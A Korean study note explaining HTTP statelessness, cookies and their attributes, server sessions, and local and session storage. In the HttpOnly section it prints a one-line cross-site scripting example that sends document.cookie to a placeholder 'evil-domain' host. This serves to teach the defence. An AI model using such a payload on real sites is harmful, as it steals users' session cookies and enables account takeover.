# cookie, session, webstorage

## HTTP 프로토콜의 특징
- 비연결지향 (Connectionless): 클라이언트가 서버에게 Request를 보내고 서버가 클라이언트에게 Response를 보내면 접속을 종료한다.
- 무상태 (Stateless): 통신이 끝나면 상태 정보를 유지하지 않는다.
- 클라이언트의 로그인 정보나 브라우저에서 입력한 값 등이 페이지를 이동할 때 마다 초기화된다. 이러한 문제점을 해결하기 위해 데이터 저장에 사용하는 것이 쿠키, 세션 그리고 웹 스토리지

## 쿠키(cookie)
- 쿠키는 클라이언트 로컬에 저장되는 키와 값 형태의 작은 파일로 이름, 값, 만료 시간, 경로 정보가 저장
- 쿠키는 주로 세 가지 목적을 위해 사용
    - 세션 관리: 서버에 저장해야 할 로그인, 장바구니, 게임 스코어 등의 정보 관리
    - 사용자 맞춤: 사용자가 선호하는 옵션이나 테마 등의 세팅
    - 사용자 추적: 사용자의 행동을 기록하고 분석하는 용도
- Response Header의 Set-Cookie 속성을 사용하면 클라이언트에 쿠키를 만들 수 있으며 만들어진 쿠키는 클라이언트가 따로 설정하지 않아도 브라우저가 Request Header에 넣어서 서버로 전송

1. 서버의 HTTP 응답 헤더에서 쿠키를 설정
```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: name=hellozin
Set-Cookie: job=developer
```

2. 이후 클라이언트에서 보내는 모든 요청에 브라우저는 Cookie 헤더를 통해 저장된 모든 쿠키를 전송
```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: name=hellozin; job=developer
```

3. 이렇게 만들어진 쿠키는 스코프에 의해 크게 두가지로 나눌 수 있다.
   - 클라이언트가 종료되면 삭제되는 휘발성 쿠키인 `Session Cookie`
   - 클라이언트가 종료되어도 일정 기간 유지되는 `Permanent Cookie`

4. Permanent Cookie는 Expires(날짜와 시간) 혹은 Max-Age(초) 를 명시해 해당 날짜, 혹은 시간까지 쿠키를 유지할 수 있고 아무것도 명시하지 않을 경우 Session Cookie 가 된다.

`명시된 만료일, 시간은 서버가 아닌 클라이언트를 기준으로 계산`

5. Domain과 Path 속성은 쿠키의 스코프를 정의
   
6. Domain 속성이 명시되면 해당 쿠키는 서브 도메인에도 포함되고 명시되지 않을 경우 현재 문서 위치의 호스트 일부를 기본값으로 한다.
```
Domain=naver.com 의 쿠키가 포함되는 서브도메인의 예
- news.naver.com
- m.naver.com
```

7. Path 속성이 명시되면 해당 쿠키는 명시된 path가 포함된 서브 디렉토리에 포함
   
```
Path=/docs 의 쿠키가 포함되는 서브디렉토리의 예
- /docs/Web/
- /docs/Web/HTTP
```

8. Secure 속성은 HTTPS 프로토콜로 암호화 된 요청일 경우에만 쿠키가 포함된다. 하지만 Secure 속성을 추가하더라도 안전하다고 볼 수 없기 때문에 민감한 정보는 쿠키에 추가해서는 안된다.

9. HttpOnly 속성은 자바스크립트의 `Document.cookie` API에 의해 쿠키가 접근되는 것을 방지한다. 이를 통해 인증된 정보를 자바스크립트를 통해 탈취하는 Cross-site 스크립팅(XXS) 공격을 막는데 도움을 준다.
```
Set-Cookie: password=DontDoThat; Secure; HttpOnly

// Cross-site 스크립팅(XXS) 공격의 예
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + 
document.cookie;
```

## 세션(session)
- 세션이란 일정 시간동안 같은 브라우저로 부터 들어오는 일련의 요구를 하나의 상태로 보고 그 상태를 유지하는 기술
- 클라이언트가 **Request** 를 보내면 **Response** 에 `Set-Cookie` 를 통해 클라이언트의 **유일한 ID값**을 생성해 부여하고 이를 통해 사용자 정보는 안전한 서버에 존재하며 클라이언트와 서버 간에는 ID 값만을 전달해 보안 위협을 감소시켜 준다.
- 이 때 클라이언트에 저장되는 쿠키는 세션 종료 시 함께 소멸되는 "Memory Cookie" 타입을 가져 브라우저가 종료되면 세션과 관련된 쿠키도 삭제된다.

## 웹스토리지(webstorage)
- **웹 스토리지**는 서버가 아닌, 클라이언트에 데이터를 저장할 수 있도록 지원하는 **HTML5**의 새로운 기능
- **쿠키**와 기능 자체는 유사하지만 **4KB** 밖에 저장하지 못하는 쿠키와 다르게 **웹 스토리지**는 약 **5MB** 까지 저장공간을 이용할 수 있다.
  - 로컬 스토리지 : 로컬 스토리지는 브라우저 자체에 반영구적으로 데이터를 저장하며, 브라우저를 종료해도 데이터가 유지된다. 다만 도메인이 다른 경우 로컬 스토리지에 접근할 수 없다. 예를 들어 **naver.com** 로컬 스토리지에서 저장한 데이터는 **google.com** 에서 접근할 수 없는 것과 같다.
  - 세션 스토리지: 세션 스토리지는 각 세션마다 데이터가 개별적으로 저장되며 로컬 스토리지와 다르게 세션을 종료하면 데이터가 자동으로 제거되며 같은 도메인이라도 세션이 다르면 데이터에 접근할 수 없다.
